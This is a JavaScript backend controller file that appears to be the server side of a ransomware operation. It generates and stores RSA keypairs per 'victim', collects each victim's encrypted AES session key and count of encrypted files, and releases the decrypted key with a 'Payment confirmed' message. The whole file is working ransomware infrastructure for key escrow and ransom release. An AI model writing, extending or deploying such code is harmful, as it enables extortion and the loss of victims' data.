import { randomUUID, generateKeyPairSync, privateDecrypt, constants } from 'crypto';
import db from '../config/db.js';

// [FIX] Convert to Async Function returning a Promise
export const createVictimIdentity = (ip) => {
    return new Promise((resolve, reject) => {
        const clientId = randomUUID();
        console.log(`[Backend] Generating keys for: ${clientId}`);
        
        const { publicKey, privateKey } = generateKeyPairSync('rsa', {
            modulusLength: 2048,
            publicKeyEncoding: { type: 'spki', format: 'pem' },
            privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
        });

        // Wait for DB Insert
        db.run(
            `INSERT OR IGNORE INTO victims (client_id, created_at, ip, private_key, public_key) VALUES (?, ?, ?, ?, ?)`,
            [clientId, new Date().toISOString(), ip, privateKey, publicKey],
            (err) => {
                if (err) {
                    console.error("DB Insert Error:", err);
                    reject(err);
                } else {
                    resolve({ clientId, publicKey, privateKey });
                }
            }
        );
    });
};

// --- Controllers ---

export const newVictim = async (req, res) => {
    try {
        // [FIX] Await the creation
        const identity = await createVictimIdentity(req.ip);
        res.status(201).json({ clientId: identity.clientId, publicKey: identity.publicKey });
    } catch (error) {
        res.status(500).json({ error: "Failed to generate identity" });
    }
};

export const reportSessionKey = (req, res) => {
    const { key, clientId, filesCount } = req.body;
    
    if (!key || !clientId) return res.status(400).json({ error: 'Missing data' });

    // [FIX] Kiểm tra xem Victim ID có tồn tại không trước khi lưu key
    db.get('SELECT 1 FROM victims WHERE client_id = ?', [clientId], (err, row) => {
        if (err) return res.status(500).json({ error: "DB Check Error" });
        
        if (!row) {
            console.warn(`[Backend] Rejected key for unknown ID: ${clientId}`);
            // Trả về 401 để Frontend biết đường reset
            return res.status(401).json({ error: "Identity invalid or expired. Please reload." });
        }

        // Nếu tồn tại thì mới lưu key
        db.run(
            `INSERT INTO session_keys (client_id, key, files_count, received_at, ip) VALUES (?, ?, ?, ?, ?)`,
            [clientId, key, filesCount || 0, new Date().toISOString(), req.ip],
            (err) => {
                if (err) {
                    console.error(err);
                    return res.status(500).json({error: "DB Insert Error"});
                }
                console.log(`[Backend] Key received for ${clientId}`);
                res.status(201).json({ stored: true });
            }
        );
    });
};

export const recoverKey = (req, res) => {
    const { clientId } = req.body;
    if (!clientId) return res.status(400).json({ error: 'Missing Client ID' });

    // 1. Find the latest session key and the victim's private key
    // [NOTE] This JOIN requires the victim to exist in 'victims' table
    const query = `
        SELECT s.key as encrypted_aes, v.private_key 
        FROM session_keys s
        JOIN victims v ON s.client_id = v.client_id
        WHERE s.client_id = ?
        ORDER BY s.id DESC LIMIT 1
    `;

    db.get(query, [clientId], (err, row) => {
        if (err) return res.status(500).json({ error: "Database error" });
        // Log this for debugging
        if (!row) {
            console.log(`[Backend] Recovery failed for ${clientId}. No key found.`);
            return res.status(404).json({ error: "No record found. Did you finish encryption?" });
        }

        try {
            const privateKey = row.private_key;
            const encryptedBuffer = Buffer.from(row.encrypted_aes, 'base64');

            const rawAesKey = privateDecrypt(
                {
                    key: privateKey,
                    padding: constants.RSA_PKCS1_PADDING,
                },
                encryptedBuffer
            );

            console.log(`[Backend] Recovering keys for ${clientId}`);

            res.json({ 
                success: true, 
                key: rawAesKey.toString('base64'),
                message: "Payment confirmed. Key released."
            });

        } catch (e) {
            console.error("Decryption error:", e);
            res.status(500).json({ error: "Server failed to decrypt key." });
        }
    });
};